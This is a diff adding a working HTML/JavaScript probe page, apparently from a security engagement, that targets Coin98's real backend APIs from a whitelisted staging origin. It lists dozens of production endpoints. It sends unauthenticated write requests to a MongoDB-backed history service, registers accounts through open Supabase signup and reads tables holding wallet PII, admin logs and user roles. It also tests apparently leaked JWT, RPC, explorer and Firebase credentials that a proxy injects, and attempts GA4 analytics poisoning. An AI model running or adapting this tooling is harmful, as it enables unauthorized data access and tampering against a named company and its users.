@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>api.c98staging.dev — Coin98 API Firewall Bypass Probe</title>
+    <style>
+        :root {
+            --bg: #0c0c0c; --bg1: #111; --bg2: #181818; --border: #2a2a2a;
+            --fg: #c8c8c8; --fg2: #888; --fg3: #555;
+            --red: #e55; --green: #5b5; --blue: #68f; --yellow: #da3; --cyan: #5cc;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'IBM Plex Mono', 'SF Mono', monospace; background: var(--bg); color: var(--fg); font-size: 12px; line-height: 1.5; }
+        .container { max-width: 1060px; margin: 0 auto; padding: 24px 20px; }
+
+        .header { border-bottom: 2px solid var(--border); padding-bottom: 16px; margin-bottom: 20px; }
+        .header-id { color: var(--fg3); font-size: 10px; letter-spacing: 2px; text-transform: uppercase; }
+        .header-title { color: #fff; font-size: 16px; font-weight: 700; margin: 4px 0; }
+        .header-desc { color: var(--fg2); font-size: 11px; max-width: 700px; }
+
+        .section { margin-bottom: 24px; }
+        .section-title { color: var(--fg3); font-size: 10px; letter-spacing: 2px; text-transform: uppercase;
+                         border-bottom: 1px solid var(--border); padding-bottom: 4px; margin-bottom: 10px; }
+
+        .env-grid { display: grid; grid-template-columns: 140px 1fr; gap: 2px 12px; font-size: 11px; }
+        .env-key { color: var(--fg3); }
+        .env-val { color: var(--cyan); word-break: break-all; }
+
+        .controls { margin-bottom: 16px; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+        button { background: var(--bg2); color: var(--green); border: 1px solid var(--green); padding: 6px 16px;
+                 cursor: pointer; font-family: inherit; font-size: 11px; }
+        button:hover { background: var(--green); color: #000; }
+        button:disabled { opacity: 0.3; cursor: not-allowed; }
+        .status-text { font-size: 11px; color: var(--fg3); }
+
+        /* Probe table */
+        .probe-table { width: 100%; border-collapse: collapse; font-size: 11px; }
+        .probe-table th { text-align: left; color: var(--fg3); font-size: 9px; letter-spacing: 1px;
+                          text-transform: uppercase; padding: 4px 8px; border-bottom: 1px solid var(--border); }
+        .probe-table td { padding: 6px 8px; border-bottom: 1px solid #1a1a1a; vertical-align: top; }
+        .probe-table tr:hover td { background: #141414; }
+
+        .badge { display: inline-block; font-size: 9px; padding: 1px 5px; font-weight: 700; letter-spacing: 0.5px; }
+        .badge.ok { background: #1a2e1a; color: var(--green); border: 1px solid #2a4a2a; }
+        .badge.blocked { background: #2e1a1a; color: var(--red); border: 1px solid #4a2a2a; }
+        .badge.partial { background: #2e2a1a; color: var(--yellow); border: 1px solid #4a3a2a; }
+        .badge.pending { background: var(--bg2); color: var(--fg3); border: 1px solid var(--border); }
+        .badge.category { background: var(--bg2); color: var(--blue); border: 1px solid #2a2a4a; }
+
+        .mono { font-family: inherit; }
+        .cors-val { font-size: 10px; }
+        .cors-star { color: var(--red); font-weight: 700; }
+        .cors-none { color: var(--fg3); }
+        .cors-origin { color: var(--green); }
+
+        .body-preview { color: var(--fg3); font-size: 10px; max-width: 320px; max-height: 60px;
+                        overflow: hidden; word-break: break-all; cursor: pointer; }
+        .body-preview.expanded { max-height: none; }
+        .body-preview:hover { color: var(--fg); }
+
+        .timing { color: var(--fg3); font-size: 10px; }
+
+        /* Detail pane */
+        .detail-pane { background: var(--bg1); border: 1px solid var(--border); padding: 12px; margin-top: 8px;
+                       display: none; font-size: 10px; }
+        .detail-pane.open { display: block; }
+        .detail-pane pre { white-space: pre-wrap; word-break: break-all; color: var(--fg2); max-height: 300px; overflow-y: auto; }
+        .detail-label { color: var(--fg3); font-size: 9px; letter-spacing: 1px; text-transform: uppercase; margin: 6px 0 2px; }
+
+        /* Summary */
+        .summary-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 8px; margin: 12px 0; }
+        .summary-card { background: var(--bg2); border: 1px solid var(--border); padding: 10px; text-align: center; }
+        .summary-card .num { font-size: 22px; font-weight: 700; }
+        .summary-card .num.green { color: var(--green); }
+        .summary-card .num.red { color: var(--red); }
+        .summary-card .num.yellow { color: var(--yellow); }
+        .summary-card .label { color: var(--fg3); font-size: 9px; margin-top: 2px; }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="header">
+        <div class="header-id">CPK-2026-001 / API Probe</div>
+        <div class="header-title">Coin98 Backend API — Firewall Bypass Probe from Whitelisted Origin</div>
+        <div class="header-desc">
+            Tests every known Coin98 backend API endpoint from this whitelisted origin.
+            Client-side fetch() probes CORS policy. Server-side proxy probes direct access.
+            Shows what data an attacker on c98staging.dev can read and write.
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Environment</div>
+        <div class="env-grid">
+            <div class="env-key">Probe Origin</div><div class="env-val" id="env-origin"></div>
+            <div class="env-key">Probe Mode</div><div class="env-val">Client-side (CORS) + Server-side (Netlify Function proxy)</div>
+            <div class="env-key">Timestamp</div><div class="env-val" id="env-ts"></div>
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Summary</div>
+        <div class="summary-grid" id="summary"></div>
+    </div>
+
+    <div class="controls">
+        <button id="btn-cors" onclick="runCorsProbes()">Run Client-Side CORS Probes</button>
+        <button id="btn-proxy" onclick="runProxyProbes()">Run Server-Side Proxy Probes</button>
+        <button onclick="runCorsProbes().then(()=>runProxyProbes())">Run All</button>
+        <span class="status-text" id="probe-status"></span>
+    </div>
+
+    <div class="section">
+        <div class="section-title">Probe Results</div>
+        <table class="probe-table">
+            <thead>
+                <tr>
+                    <th style="width:30px;">#</th>
+                    <th style="width:60px;">Cat</th>
+                    <th>Endpoint</th>
+                    <th style="width:70px;">CORS</th>
+                    <th style="width:70px;">Proxy</th>
+                    <th style="width:80px;">CORS Header</th>
+                    <th style="width:50px;">Time</th>
+                    <th>Response Preview</th>
+                </tr>
+            </thead>
+            <tbody id="probe-body"></tbody>
+        </table>
+    </div>
+
+</div>
+
+<script>
+document.getElementById('env-origin').textContent = window.location.origin;
+document.getElementById('env-ts').textContent = new Date().toISOString();
+
+// ── ALL secrets are server-side only (Netlify env vars) ──
+// Client sends authHint strings; proxy.mjs injects credentials from process.env
+
+// ── ALL Coin98 endpoints from ASSET_INTELLIGENCE.md ──
+// Sections: 8 (Backend Services), 11c (Backend Service Map), 7 (CORS), 6 (Host Fingerprints), 11.0f (Secrets)
+// authHint tells the server-side proxy which env var credential to inject
+const ENDPOINTS = [
+
+    // ═══ superwallet-markets (WAF ALB) — Express.js + Helmet.js ═══
+    { cat: 'ALB', name: 'Markets — /health', url: 'https://superwallet-markets.coin98.tech/health', method: 'GET' },
+    { cat: 'ALB', name: 'Markets — /api/tokens (8.1MB registry)', url: 'https://superwallet-markets.coin98.tech/api/tokens', method: 'GET' },
+    { cat: 'ALB', name: 'Markets — /api/token-prices (18,636 tokens)', url: 'https://superwallet-markets.coin98.tech/api/token-prices', method: 'GET' },
+    { cat: 'ALB', name: 'Markets — /coin/multichain?cgkId=ethereum', url: 'https://superwallet-markets.coin98.tech/coin/multichain?cgkId=ethereum', method: 'GET' },
+
+    // ═══ superwallet-misc (PRD ALB, NO WAF) — Express.js, Swagger exposed ═══
+    { cat: 'ALB', name: 'Misc — /health', url: 'https://superwallet-misc.coin98.tech/health', method: 'GET' },
+    { cat: 'ALB', name: 'Misc — /swagger.json (OpenAPI 3.0 spec)', url: 'https://superwallet-misc.coin98.tech/swagger.json', method: 'GET' },
+    { cat: 'ALB', name: 'Misc — /staking-pools (NO AUTH)', url: 'https://superwallet-misc.coin98.tech/staking-pools', method: 'GET' },
+    { cat: 'ALB', name: 'Misc — /staking-pools/featured (NO AUTH)', url: 'https://superwallet-misc.coin98.tech/staking-pools/featured', method: 'GET' },
+    { cat: 'ALB', name: 'Misc — /staking-pools/chains (NO AUTH)', url: 'https://superwallet-misc.coin98.tech/staking-pools/chains', method: 'GET' },
+    { cat: 'ALB', name: 'Misc — /events (requires auth)', url: 'https://superwallet-misc.coin98.tech/events', method: 'GET' },
+
+    // ═══ superwallet-history-records (PRD ALB, NO WAF) — UNAUTH WRITES ═══
+    { cat: 'ALB', name: 'History — /health', url: 'https://superwallet-history-records.coin98.tech/health', method: 'GET' },
+    { cat: 'WRITE', name: 'History — POST /record/log (UNAUTH MongoDB write!)', url: 'https://superwallet-history-records.coin98.tech/record/log', method: 'POST',
+      body: JSON.stringify({from:"0x0000000000000000000000000000000000000000",to:"0x0000000000000000000000000000000000000001",amount:"0",chain:"ethereum",hash:"0xCPK_API_PROBE",type:"transfer",status:"pending"}) },
+    { cat: 'WRITE', name: 'History — POST /record/log/dapps (UNAUTH write!)', url: 'https://superwallet-history-records.coin98.tech/record/log/dapps', method: 'POST',
+      body: JSON.stringify({chain:"ethereum",dapp:"cpk-probe-test",action:"open",source:"api.c98staging.dev"}) },
+
+    // ═══ superlink-server (PRD ALB, NO WAF) ═══
+    { cat: 'ALB', name: 'Superlink — /health', url: 'https://superlink-server.coin98.tech/health', method: 'GET' },
+
+    // ═══ general-inventory (Shared ALB, NO WAF) — Express.js ═══
+    { cat: 'ALB', name: 'Inventory — /health', url: 'https://general-inventory.coin98.tech/health', method: 'GET' },
+    { cat: 'ALB', name: 'Inventory — /images (token icons)', url: 'https://general-inventory.coin98.tech/images', method: 'GET' },
+
+    // ═══ assets-api (Shared ALB, NO WAF) ═══
+    { cat: 'ALB', name: 'Assets API — /health', url: 'https://assets-api.coin98.tech/health', method: 'GET' },
+
+    // ═══ superwallet-xpoint (Cloudflare) — 31K wallet addresses ═══
+    { cat: 'CF', name: 'Xpoint — /api/v1/boba/contract', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/contract', method: 'GET' },
+    { cat: 'CF', name: 'Xpoint — /api/v1/boba/leaderboard (31,309 wallets, 3MB)', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/leaderboard', method: 'GET' },
+    { cat: 'CF', name: 'Xpoint — /api/v1/boba/balance?address=0x0', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/balance?address=0x0000000000000000000000000000000000000000', method: 'GET' },
+    { cat: 'CF', name: 'Xpoint — /api/v1/boba/history?address=0x0', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/history?address=0x0000000000000000000000000000000000000000', method: 'GET' },
+    { cat: 'CF', name: 'Xpoint — /api/v1/boba/stats (auth required)', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/stats', method: 'GET' },
+
+    // ═══ superwallet-information-api (Cloudflare) ═══
+    { cat: 'CF', name: 'Information API — /api/solanaV4', url: 'https://superwallet-information-api.coin98.tech/api/solanaV4', method: 'GET' },
+
+    // ═══ Cloudflare-walled APIs ═══
+    { cat: 'CF', name: 'api.coin98.com (main API)', url: 'https://api.coin98.com/', method: 'GET' },
+    { cat: 'CF', name: 'information.coin98.com (legacy data)', url: 'https://information.coin98.com/', method: 'GET' },
+    { cat: 'CF', name: 'encrypted.coin98.com (encrypted data svc)', url: 'https://encrypted.coin98.com/', method: 'GET' },
+    { cat: 'CF', name: 'fragment-api.coin98.com (social recovery)', url: 'https://fragment-api.coin98.com/', method: 'GET' },
+
+    // ═══ Supabase — Campaign (jdxkhxqpoqafflwspzte) — RLS BYPASS ═══
+    { cat: 'SUPA', name: 'Campaign — /campaigns', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/campaigns?select=*&limit=5', method: 'GET', authHint: 'supabase_campaign' },
+    { cat: 'SUPA', name: 'Campaign — /lc_campaigns (WALLET PII + volumes!)', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/lc_campaigns?select=*&limit=5', method: 'GET', authHint: 'supabase_campaign' },
+    { cat: 'SUPA', name: 'Campaign — /creator_campaigns', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/creator_campaigns?select=*&limit=5', method: 'GET', authHint: 'supabase_campaign' },
+    { cat: 'SUPA', name: 'Campaign — /perp_campaigns', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/perp_campaigns?select=*&limit=5', method: 'GET', authHint: 'supabase_campaign' },
+    { cat: 'SUPA', name: 'Campaign — /profiles', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/profiles?select=*&limit=5', method: 'GET', authHint: 'supabase_campaign' },
+    { cat: 'SUPA', name: 'Campaign — /user_roles', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/rest/v1/user_roles?select=*&limit=5', method: 'GET', authHint: 'supabase_campaign' },
+    { cat: 'SUPA', name: 'Campaign — /auth/v1/settings', url: 'https://jdxkhxqpoqafflwspzte.supabase.co/auth/v1/settings', method: 'GET', authHint: 'supabase_campaign_anon' },
+
+    // ═══ Supabase — 2025 Recap (wxgwpabjnpylabpktlvr) — OPEN SIGNUP ═══
+    { cat: 'SUPA', name: '2025 — /admin_activity_logs (PII: email, IP)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/rest/v1/admin_activity_logs?select=*&limit=5', method: 'GET', authHint: 'supabase_2025' },
+    { cat: 'SUPA', name: '2025 — /wallet_addresses (user_id → wallet)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/rest/v1/wallet_addresses?select=*&limit=5', method: 'GET', authHint: 'supabase_2025' },
+    { cat: 'SUPA', name: '2025 — /page_views (tracking data)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/rest/v1/page_views?select=*&limit=5', method: 'GET', authHint: 'supabase_2025' },
+    { cat: 'SUPA', name: '2025 — /onchain_data', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/rest/v1/onchain_data?select=*&limit=5', method: 'GET', authHint: 'supabase_2025' },
+    { cat: 'SUPA', name: '2025 — /auth/v1/settings (signup open!)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/auth/v1/settings', method: 'GET', authHint: 'supabase_2025_anon' },
+    { cat: 'WRITE', name: '2025 — POST /auth/v1/signup (OPEN REGISTRATION!)', url: 'https://wxgwpabjnpylabpktlvr.supabase.co/auth/v1/signup', method: 'POST', authHint: 'supabase_2025_anon',
+      body: JSON.stringify({email:"cpk-api-probe@example.com",password:"CPK_probe_2026!"}) },
+
+    // ═══ S3 / CloudFront ═══
+    { cat: 'S3', name: 'S3 — coin98.s3 public bucket (Chains/)', url: 'https://coin98.s3.ap-southeast-1.amazonaws.com/Coin/coin98.png', method: 'GET' },
+    { cat: 'S3', name: 'Connect SPA (S3 via CloudFront, CORS:*, no security headers)', url: 'https://connect.coin98.com/', method: 'GET' },
+    { cat: 'S3', name: 'Livechat SPA (S3 via CloudFront, CORS:*, no security headers)', url: 'https://livechat.coin98.com/', method: 'GET' },
+
+    // ═══ Firebase ═══
+    { cat: 'GCP', name: 'Firebase Cloud Functions', url: 'https://us-central1-coin98-b7f98.cloudfunctions.net/', method: 'GET' },
+    { cat: 'GCP', name: 'Firebase Realtime DB (locked)', url: 'https://coin98-b7f98.firebaseio.com/.json', method: 'GET' },
+
+    // ═══ Staging (referenced in production JS/configs) ═══
+    { cat: 'STG', name: 'Misc staging — superwallet-misc-api-stg.coin98.dev', url: 'https://superwallet-misc-api-stg.coin98.dev/', method: 'GET' },
+    { cat: 'STG', name: 'Development API — development.coin98.services', url: 'https://development.coin98.services/', method: 'GET' },
+    { cat: 'STG', name: 'Ramper v2 staging — ramper-v2-fragment-stg', url: 'https://ramper-v2-fragment-stg.coin98.dev/', method: 'GET' },
+    { cat: 'STG', name: 'Telegram wallet staging', url: 'https://superwallet-telegramwallet-test.coin98.dev/', method: 'GET' },
+    { cat: 'STG', name: 'VPN — vpn.coin98.dev (Corporate Pritunl)', url: 'https://vpn.coin98.dev/', method: 'GET' },
+
+    // ═══ Whitelisted origins (COIN98_SYSTEM) — CSP/CORS analysis ═══
+    { cat: 'WL', name: 'dagora.xyz (CORS:*, script-src *, unsafe-inline)', url: 'https://dagora.xyz/', method: 'GET' },
+    { cat: 'WL', name: 'baryon.network (ZERO CSP, CF WAF only)', url: 'https://baryon.network/', method: 'GET' },
+    { cat: 'WL', name: 'dex.saros.xyz (unsafe-eval, unsafe-inline)', url: 'https://dex.saros.xyz/', method: 'GET' },
+    { cat: 'WL', name: 'coin98.com (CORS:*, no HSTS, no CSP)', url: 'https://coin98.com/', method: 'GET' },
+    { cat: 'WL', name: 'creator.coin98.com (CORS:*)', url: 'https://creator.coin98.com/', method: 'GET' },
+    { cat: 'WL', name: 'connect.coin98.com (S3, CORS:*, ZERO security headers)', url: 'https://connect.coin98.com/', method: 'GET' },
+
+    // ═══ Third-party RPC APIs (keys injected server-side from env) ═══
+    { cat: 'RPC', name: 'Infura #1 mainnet (REVOKED)', url: 'https://mainnet.infura.io/v3/', method: 'POST', authHint: 'infura_1',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_blockNumber",params:[]}) },
+    { cat: 'RPC', name: 'Infura #2 mainnet', url: 'https://mainnet.infura.io/v3/', method: 'POST', authHint: 'infura_2',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_blockNumber",params:[]}) },
+    { cat: 'RPC', name: 'Infura #3 mainnet (REVOKED)', url: 'https://mainnet.infura.io/v3/', method: 'POST', authHint: 'infura_3',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_blockNumber",params:[]}) },
+    { cat: 'RPC', name: 'Infura default', url: 'https://mainnet.infura.io/v3/', method: 'POST', authHint: 'infura_default',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_blockNumber",params:[]}) },
+    { cat: 'RPC', name: 'NodeReal BSC (DEACTIVATED)', url: 'https://bsc-mainnet.nodereal.io/v1/', method: 'POST', authHint: 'nodereal_bsc',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"eth_blockNumber",params:[]}) },
+    { cat: 'RPC', name: 'BlockVision Sui', url: 'https://sui-mainnet.blockvision.org/v1/', method: 'POST', authHint: 'blockvision_sui',
+      body: JSON.stringify({jsonrpc:"2.0",id:1,method:"sui_getLatestCheckpointSequenceNumber",params:[]}) },
+    { cat: 'RPC', name: 'TON API (bearer auth)', url: 'https://tonapi.io/v2/blockchain/masterchain-head', method: 'GET', authHint: 'ton' },
+
+    // ═══ Block Explorer APIs (keys injected server-side) ═══
+    { cat: 'SCAN', name: 'Basescan (V1 deprecated)', url: 'https://api.basescan.org/api?module=proxy&action=eth_blockNumber', method: 'GET', authHint: 'basescan' },
+    { cat: 'SCAN', name: 'Lineascan (V1 deprecated)', url: 'https://api.lineascan.build/api?module=proxy&action=eth_blockNumber', method: 'GET', authHint: 'lineascan' },
+    { cat: 'SCAN', name: 'Scrollscan (V1 deprecated)', url: 'https://api.scrollscan.com/api?module=proxy&action=eth_blockNumber', method: 'GET', authHint: 'scrollscan' },
+    { cat: 'SCAN', name: 'OKLink (REVOKED)', url: 'https://www.oklink.com/api/v5/explorer/block/block-fills?chainShortName=manta&limit=1', method: 'GET', authHint: 'oklink' },
+
+    // ═══ GA4 Analytics Poisoning (creds injected server-side) ═══
+    { cat: 'GA4', name: 'GA4 debug/mp/collect (analytics poisoning)', url: 'https://www.google-analytics.com/debug/mp/collect?', method: 'POST', authHint: 'ga4',
+      body: JSON.stringify({client_id:"CPK_PROBE_TEST",events:[{name:"cpk_probe",params:{probe:true}}]}) },
+
+    // ═══ JWT Auth Probes (tokens injected server-side) ═══
+    { cat: 'JWT', name: 'Misc /events (JWT HS512 no-expiry, id=526)', url: 'https://superwallet-misc.coin98.tech/events', method: 'GET', authHint: 'jwt_hs512' },
+    { cat: 'JWT', name: 'Xpoint /api/v1/boba/stats (JWT HS512)', url: 'https://superwallet-xpoint.coin98.tech/api/v1/boba/stats', method: 'GET', authHint: 'jwt_hs512' },
+    { cat: 'JWT', name: 'Markets with HMAC sig header', url: 'https://superwallet-markets.coin98.tech/health', method: 'GET', authHint: 'hmac' },
+
+    // ═══ Firebase (key injected server-side) ═══
+    { cat: 'GCP', name: 'Firebase Auth — list providers', url: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/getProjectConfig?key=', method: 'GET', authHint: 'firebase' },
+
+    // ═══ Related domains (parent company TLS cert SANs) ═══
+    { cat: 'REL', name: 'amberblocks.com (parent company)', url: 'https://amberblocks.com/', method: 'GET' },
+    { cat: 'REL', name: 'frontierdao.org (no CF, direct IP)', url: 'https://frontierdao.org/', method: 'GET' },
+];
+
+// State
+const results = new Map();
+
+// ── Render initial table ──
+function renderTable() {
+    const tbody = document.getElementById('probe-body');
+    tbody.innerHTML = ENDPOINTS.map((ep, i) => `
+        <tr id="row-${i}" onclick="toggleDetail(${i})" style="cursor:pointer;">
+            <td style="color:var(--fg3);">${i + 1}</td>
+            <td><span class="badge category">${ep.cat}</span></td>
+            <td style="color:var(--cyan);font-size:10px;" title="${ep.url}">${ep.name}</td>
+            <td id="cors-${i}"><span class="badge pending">—</span></td>
+            <td id="proxy-${i}"><span class="badge pending">—</span></td>
+            <td id="corsval-${i}" class="cors-val cors-none">—</td>
+            <td id="time-${i}" class="timing">—</td>
+            <td id="preview-${i}" class="body-preview">—</td>
+        </tr>
+        <tr><td colspan="8"><div class="detail-pane" id="detail-${i}">
+            <div class="detail-label">Request</div>
+            <pre id="req-${i}">—</pre>
+            <div class="detail-label">Response Headers</div>
+            <pre id="resheaders-${i}">—</pre>
+            <div class="detail-label">Response Body</div>
+            <pre id="resbody-${i}">—</pre>
+        </div></td></tr>
+    `).join('');
+}
+
+function toggleDetail(i) {
+    document.getElementById('detail-' + i).classList.toggle('open');
+}
+
+function updateSummary() {
+    let accessible = 0, blocked = 0, proxied = 0, total = ENDPOINTS.length;
+    results.forEach(r => {
+        if (r.cors === 'ok') accessible++;
+        else if (r.cors === 'blocked') blocked++;
+        if (r.proxy === 'ok') proxied++;
+    });
+    document.getElementById('summary').innerHTML = `
+        <div class="summary-card"><div class="num green">${accessible}</div><div class="label">CORS Accessible (browser)</div></div>
+        <div class="summary-card"><div class="num yellow">${proxied}</div><div class="label">Proxy Accessible (server)</div></div>
+        <div class="summary-card"><div class="num red">${blocked}</div><div class="label">CORS Blocked</div></div>
+        <div class="summary-card"><div class="num" style="color:var(--cyan);">${total}</div><div class="label">Total Endpoints Tested</div></div>
+    `;
+}
+
+// ── Client-side CORS probe ──
+async function runCorsProbes() {
+    const st = document.getElementById('probe-status');
+    st.textContent = 'Running CORS probes...';
+    document.getElementById('btn-cors').disabled = true;
+
+    for (let i = 0; i < ENDPOINTS.length; i++) {
+        const ep = ENDPOINTS[i];
+        const t0 = performance.now();
+
+        try {
+            const fetchOpts = {
+                method: ep.method,
+                mode: 'cors',
+                headers: { 'Accept': 'application/json, text/html, */*' },
+            };
+            if (ep.body) {
+                fetchOpts.body = ep.body;
+                fetchOpts.headers['Content-Type'] = 'application/json';
+            }
+            const ac = new AbortController();
+            const to = setTimeout(() => ac.abort(), 10000);
+            fetchOpts.signal = ac.signal;
+            const resp = await fetch(ep.url, fetchOpts);
+            clearTimeout(to);
+
+            const dt = Math.round(performance.now() - t0);
+            const corsHeader = resp.headers.get('access-control-allow-origin') || '';
+            const ct = resp.headers.get('content-type') || '';
+            let body = '';
+            try { body = await resp.text(); } catch (e) {}
+
+            // Collect all readable headers
+            const headers = {};
+            resp.headers.forEach((v, k) => { headers[k] = v; });
+
+            const r = results.get(i) || {};
+            r.cors = 'ok';
+            r.corsStatus = resp.status;
+            r.corsHeader = corsHeader;
+            r.corsTime = dt;
+            r.corsHeaders = headers;
+            r.corsBody = body;
+            results.set(i, r);
+
+            document.getElementById('cors-' + i).innerHTML = `<span class="badge ok">${resp.status}</span>`;
+            document.getElementById('time-' + i).textContent = `${dt}ms`;
+
+            if (corsHeader === '*') {
+                document.getElementById('corsval-' + i).innerHTML = `<span class="cors-star">*</span>`;
+            } else if (corsHeader) {
+                document.getElementById('corsval-' + i).innerHTML = `<span class="cors-origin">${corsHeader}</span>`;
+            } else {
+                document.getElementById('corsval-' + i).innerHTML = `<span class="cors-none">none</span>`;
+            }
+
+            const preview = body.slice(0, 200);
+            document.getElementById('preview-' + i).textContent = preview + (body.length > 200 ? '...' : '');
+            document.getElementById('req-' + i).textContent = `${ep.method} ${ep.url}\nOrigin: ${window.location.origin}\nMode: cors`;
+            document.getElementById('resheaders-' + i).textContent = JSON.stringify(headers, null, 2);
+            document.getElementById('resbody-' + i).textContent = body.slice(0, 2000) + (body.length > 2000 ? `\n... (${body.length} bytes total)` : '');
+
+        } catch (e) {
+            const dt = Math.round(performance.now() - t0);
+            const r = results.get(i) || {};
+            r.cors = 'blocked';
+            r.corsTime = dt;
+            r.corsError = e.message;
+            results.set(i, r);
+
+            const isTimeout = e.message?.includes('timeout') || e.message?.includes('abort');
+            document.getElementById('cors-' + i).innerHTML = `<span class="badge blocked">${isTimeout ? 'TIMEOUT' : 'BLOCKED'}</span>`;
+            document.getElementById('time-' + i).textContent = `${dt}ms`;
+            document.getElementById('preview-' + i).textContent = e.message;
+            document.getElementById('req-' + i).textContent = `${ep.method} ${ep.url}\nOrigin: ${window.location.origin}`;
+            document.getElementById('resbody-' + i).textContent = `Error: ${e.message}`;
+        }
+
+        updateSummary();
+    }
+
+    st.textContent = `CORS probes complete. ${[...results.values()].filter(r => r.cors === 'ok').length}/${ENDPOINTS.length} accessible.`;
+    document.getElementById('btn-cors').disabled = false;
+}
+
+// ── Server-side proxy probe ──
+async function runProxyProbes() {
+    const st = document.getElementById('probe-status');
+    st.textContent = 'Running proxy probes...';
+    document.getElementById('btn-proxy').disabled = true;
+
+    for (let i = 0; i < ENDPOINTS.length; i++) {
+        const ep = ENDPOINTS[i];
+
+        try {
+            const proxyPayload = { url: ep.url, method: ep.method };
+            if (ep.body) proxyPayload.body = ep.body;
+            if (ep.authHint) proxyPayload.authHint = ep.authHint;
+            const pac = new AbortController();
+            const pto = setTimeout(() => pac.abort(), 15000);
+            const resp = await fetch('/.netlify/functions/proxy', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(proxyPayload),
+                signal: pac.signal,
+            });
+            clearTimeout(pto);
+
+            const data = await resp.json();
+
+            const r = results.get(i) || {};
+            r.proxy = data.status ? 'ok' : 'fail';
+            r.proxyStatus = data.status;
+            r.proxyHeaders = data.headers;
+            r.proxyBody = data.body;
+            r.proxyError = data.error;
+            results.set(i, r);
+
+            const proxyStatus = data.status || 0;
+            const proxyOk = proxyStatus >= 200 && proxyStatus < 300;
+            if (proxyStatus) {
+                document.getElementById('proxy-' + i).innerHTML = `<span class="badge ${proxyOk ? 'ok' : 'blocked'}">${proxyStatus}</span>`;
+            } else {
+                document.getElementById('proxy-' + i).innerHTML = `<span class="badge blocked">ERR</span>`;
+            }
+
+            // Update detail pane with proxy data + debug log
+            const logInfo = data.log ? `\n\n═══ PROXY DEBUG LOG ═══\nauthHint: ${data.log.authHint}\nauthInjected: ${JSON.stringify(data.log.authInjected)}\nurlModified: ${data.log.urlModified}\nfinalUrlDomain: ${data.log.finalUrlDomain || ''}\nsentHeaderKeys: ${JSON.stringify(data.log.sentHeaderKeys)}\nhasBody: ${data.log.hasBody}\nbodyLength: ${data.log.bodyLength || 0}\nbodyPreview: ${data.log.bodyPreview || ''}\nmissingEnvKeys: ${JSON.stringify(data.log.missingEnvKeys)}\nresponseTime: ${data.log.responseTime}ms\nresponseSize: ${data.log.responseSize || 0} bytes` : '';
+            if (data.body || logInfo) {
+                document.getElementById('resbody-' + i).textContent = (data.body || '').slice(0, 2000) + logInfo;
+                document.getElementById('resheaders-' + i).textContent = JSON.stringify(data.headers, null, 2);
+                document.getElementById('preview-' + i).textContent = (data.body || '').slice(0, 200);
+            }
+
+        } catch (e) {
+            const r = results.get(i) || {};
+            r.proxy = 'fail';
+            r.proxyError = e.message;
+            results.set(i, r);
+            document.getElementById('proxy-' + i).innerHTML = `<span class="badge blocked">ERR</span>`;
+        }
+
+        updateSummary();
+    }
+
+    st.textContent = `All probes complete.`;
+    document.getElementById('btn-proxy').disabled = false;
+}
+
+// ── Init ──
+renderTable();
+updateSummary();
+</script>
+</body>
+</html>
